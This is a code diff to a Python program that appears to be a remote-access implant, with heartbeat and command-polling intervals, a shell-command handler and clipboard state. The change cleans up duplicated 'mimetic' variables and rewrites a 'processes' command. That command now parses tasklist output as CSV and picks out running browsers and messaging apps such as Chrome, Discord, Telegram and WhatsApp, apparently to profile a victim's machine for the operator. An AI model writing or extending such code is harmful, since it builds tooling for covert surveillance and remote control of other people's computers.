@@ -57,9 +57,6 @@ clipboard_file = None
 clipboard_cut = False
 current_heartbeat_interval = HEARTBEAT_INTERVAL_SECONDS
 current_command_check_interval = COMMAND_CHECK_INTERVAL_SECONDS
-mimetic_active = False
-mimetic_log = []
-mimetic_finished = False
 current_inactivity_threshold = INACTIVITY_THRESHOLD_SECONDS
 mimetic_active = False
 mimetic_log = []
@@ -509,7 +506,6 @@ def execute_shell_command(cmd_str):
     global current_working_dir
     global clipboard_file
     global clipboard_cut
-    global mimetic_active, mimetic_log, mimetic_finished
 
     try:
         cmd_lower = cmd_str.lower().strip()
@@ -937,16 +933,16 @@ def execute_shell_command(cmd_str):
         # Handle processes command - show running processes (filtered)
         if cmd_lower == "processes":
             try:
-                # Run tasklist with increased timeout
-                result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=15)
+                # Use CSV format for reliable parsing
+                result = subprocess.run(["tasklist", "/fo", "csv"], capture_output=True, text=True, timeout=15)
                 if not result.stdout:
                     return "No processes running"
 
                 lines = result.stdout.strip().split("\n")
-                if len(lines) < 3:
+                if len(lines) < 2:
                     return "No processes running"
 
-                # Keywords for interesting processes - expanded list
+                # Keywords for interesting processes
                 keywords = [
                     'chrome', 'firefox', 'edge', 'opera', 'safari', 'brave', 'iexplore',
                     'discord', 'telegram', 'slack', 'skype', 'teams', 'whatsapp',
@@ -966,44 +962,36 @@ def execute_shell_command(cmd_str):
                 output_lines = ["Image Name                     PID"]
                 output_lines.append("=================================================")
 
-                # Process each line (skip header and separator which are first 2 lines)
+                # Parse CSV (skip header line which is first line)
                 seen = set()
-                for line in lines[2:]:
+                for line in lines[1:]:
                     line = line.strip()
-                    if not line or line.startswith('='):
+                    if not line:
                         continue
 
-                    line_lower = line.lower()
+                    # Remove quotes and split by comma
+                    line = line.replace('"', '')
+                    parts = line.split(',')
 
-                    # Check if line contains any keyword
-                    has_keyword = any(kw in line_lower for kw in keywords)
-                    if not has_keyword:
-                        continue
-
-                    # Parse: find last number (PID) and everything before it (name)
-                    parts = line.split()
                     if len(parts) < 2:
                         continue
 
-                    # Try to find the PID (last numeric part)
-                    pid = None
-                    pid_idx = -1
-                    for i in range(len(parts) - 1, -1, -1):
-                        if parts[i].isdigit():
-                            pid = parts[i]
-                            pid_idx = i
-                            break
+                    # CSV format: "Name","PID",...
+                    name = parts[0].strip()
+                    pid = parts[1].strip()
 
-                    if not pid:
+                    if not name or not pid or not pid.isdigit():
                         continue
 
-                    # Get process name (everything before PID)
-                    name = ' '.join(parts[:pid_idx]) if pid_idx > 0 else parts[0]
-                    if not name:
+                    name_lower = name.lower()
+
+                    # Check if contains keyword
+                    has_keyword = any(kw in name_lower for kw in keywords)
+                    if not has_keyword:
                         continue
 
                     # Avoid duplicates
-                    key = (name.lower(), pid)
+                    key = (name_lower, pid)
                     if key in seen:
                         continue
                     seen.add(key)
